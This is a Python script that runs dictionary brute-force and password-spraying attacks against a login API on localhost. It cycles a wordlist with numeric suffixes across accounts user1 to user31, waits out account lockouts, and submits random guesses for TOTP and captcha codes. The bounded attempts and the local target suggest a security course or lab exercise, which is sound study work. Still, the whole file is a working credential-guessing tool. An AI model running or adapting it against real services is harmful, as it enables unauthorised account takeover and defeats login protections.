import requests
import json
import time
import secrets
import string
import os


LOCAL_ADDRESS = 'http://127.0.0.1:8000'
DO_PASSWORD_SPARYING = 1 # 0 for brute force , 1 for password spraying
LAST_USER = 31 # the last user to test (11/21/31)
FIRST_USER = 1 # the first user to test (1/11/21)
MAX_ATTEMPTS = 50000    
MAX_SECONDS = 2 * 3600   # 2 hours in secs
THREE_MINS_IN_SECS = 3 * 60

def load_common_password():
    base_dir = os.path.dirname(__file__)
    path = os.path.join(base_dir, 'dictionary_attack.txt')
    with open(path, 'r') as file:
        return file.read().splitlines()
    
def check_time_limit(start_time):
    #check time limit
    elapsed_time = time.time() - start_time
    if elapsed_time >= MAX_SECONDS:
        print("Reached time limit (2 hours).")
        return False
    else:
        return True
    
def check_attempts_limit(attempt_count):
    if attempt_count >= MAX_ATTEMPTS:
        print("Reached maximum attempts limit.")
        return False
    else:
        return True




def post(username, password, session, code, type):

    # Post to the login endpoint
    if type == "totp":
        url = f"{LOCAL_ADDRESS}/api/login_totp"
        data = {
        'username': username,
        'password': password,
        'totp_code': code or '',
        'captch_code': ''
        }
    else:
        url = f"{LOCAL_ADDRESS}/api/login"
        data = {
        'username': username,
        'password': password,
        'totp_code': '',
        'captch_code': code or ''
        } 

    try:
        response = session.post(url, json=data)
    except requests.RequestException as e:
        print(f"Request failed: {e}")
        return None

    print(f"Status Code: {response.status_code}")
    # Only attempt to parse JSON if the response reports JSON
    content_type = response.headers.get('Content-Type', '')
    if 'application/json' in content_type:
        try:
            print(username, password, code)
            return response.status_code, json.dumps(response.text)
        except ValueError:
            print("Response said JSON but could not parse it")
    else:
        print(username, password, code)
    return response.status_code, response.text


def start_brute_force():
    session = requests.Session()
    session.headers.update({'Connection': 'keep-alive'})

    for u in ["user2","user16", "user29"]:
        try:
            if brute_force(u,session):
                print("hacked!")
            else:
                print("password too strong")
        except Exception as e:
            print("EXCEPTION:", e)
            print('error in sending info to the server')


def brute_force(username,session):
    common_passwords = load_common_password()
    print("passwords loaded")
    start_time = time.time()  
    attempt_count = 0
    print("starting session")
    type = "login"
    code = ""
    i = 0 
    answer = (0,"")
    password_found = False

    while answer[0] != 200 and i < len(common_passwords):
        if not password_found:
            password = common_passwords[i]
        
        if not check_attempts_limit(attempt_count):
            return
        
        if not check_time_limit(start_time):
            return
        
        print("passed test")
        #check password without suffix
        print(password, username)
        answer = post(username, password, session, code, type)
        time.sleep(0.05)
        print(answer)
        attempt_count += 1

        if answer[0] == 200:
            return 1
        if (answer[0] == 403 or answer[0] == 401) and "totp" in answer[1]:
            type = "totp"
            code = generate_totp_code()
            password_found = True
            continue
        elif answer[0] == 403 and "captcha" in answer[1]:
            type = "captcha"
            i += 1
            code = generate_captcha_code()
            
        elif answer[0] == 423:
            time.sleep(THREE_MINS_IN_SECS)
        else:
            i += 1
            password_found = False
        
        if not password.isdigit() and not password_found:
            #check password with suffix
            for length in [1, 2]:
                if password_found: 
                    break
                for j in range(10**length):
                    suffix = f"{j:0{length}}"
                    current_password = password + suffix
                    if not check_attempts_limit(attempt_count):
                        return
                    
                    if not check_time_limit(start_time):
                        return
                    answer = post(username, current_password, session, code, type)
                    time.sleep(0.05)
                    attempt_count += 1 

                    if answer[0] == 200:
                        return 1
                    if (answer[0] == 403 or answer[0] == 401) and "totp" in answer[1]:
                        type = "totp"
                        code = generate_totp_code()
                        password_found = True
                        break
                    elif answer[0] == 403 and "captcha" in answer[1]:
                        type = "captcha"
                        code = generate_captcha_code()
                    elif answer[0] == 423:
                        time.sleep(THREE_MINS_IN_SECS)
                    else:
                        password_found = False
                

                    
    if answer[0] == 200:
        return 1       
    return 0


def start_password_spraying():
    #repeated code need to fix
    print("start password spraying")
    start_time = time.time()  
    attempt_count = 0
    session = requests.Session()
    session.headers.update({'Connection': 'keep-alive'})
    common_passwords = load_common_password()


    for password in common_passwords:
        try:
            result = password_sparying(password, session, start_time, attempt_count)
            if result[0] == 1:
                print("hacked!")
                return
            elif result[0] == 4:
                print("too many attempts")
                return
            elif result[0] == 5:
                print("too much time attempts")
                return
            else:
                attempt_count = result[1]
            
            if not password.isdigit():
            #check password with suffix
                for length in [1, 2]:
                    for i in range(10**length):
                        suffix = f"{i:0{length}}"
                        current_password = password + suffix
                        result = password_sparying(current_password, session, start_time, attempt_count)
                        if result[0]:
                            return
                        else:
                            attempt_count = result[1]
                            
        except Exception as e:
            print("EXCEPTION:", e)
            print('error in sending info to the server')
            return


def password_sparying(password, session, start_time,attempt_count):   
    type = "login"
    code = None
    i = FIRST_USER
    answer = (0,"")
    while answer[0] != 200 and i < LAST_USER:

        #check attempts limit
        if not check_attempts_limit(attempt_count):
            return (4, attempt_count)
        
        #check time limit
        if not check_time_limit(start_time):
            return (5,attempt_count)
        
        
        answer = post(f'user{i}', password, session,code, type)
        time.sleep(0.05)
        print("waiting for an answer")

        attempt_count += 1 

        if (answer[0] == 403 or answer[0] == 401) and "totp" in answer[1]:
            type = "totp"
            code = generate_totp_code()
        elif answer[0] == 403 and "captcha" in answer[1]:
            type = "captcha"
            i += 1
            code = generate_captcha_code()
        elif answer[0] == 423:
            time.sleep(THREE_MINS_IN_SECS)
        else:
            i += 1

    if answer[0] == 200:
        return (1, attempt_count)
    
    return (0, attempt_count)


def generate_captcha_code():
    length = 6
    allowed_characters = string.ascii_uppercase + string.digits
    otp = ''.join(secrets.choice(allowed_characters) for _ in range(length))
    return otp

def generate_totp_code():
    length = 6
    allowed_characters = string.digits
    otp = ''.join(secrets.choice(allowed_characters) for _ in range(length))
    return otp


def main():
    if DO_PASSWORD_SPARYING:
        start_password_spraying()
    else:
        start_brute_force()


if __name__ == '__main__':
    main()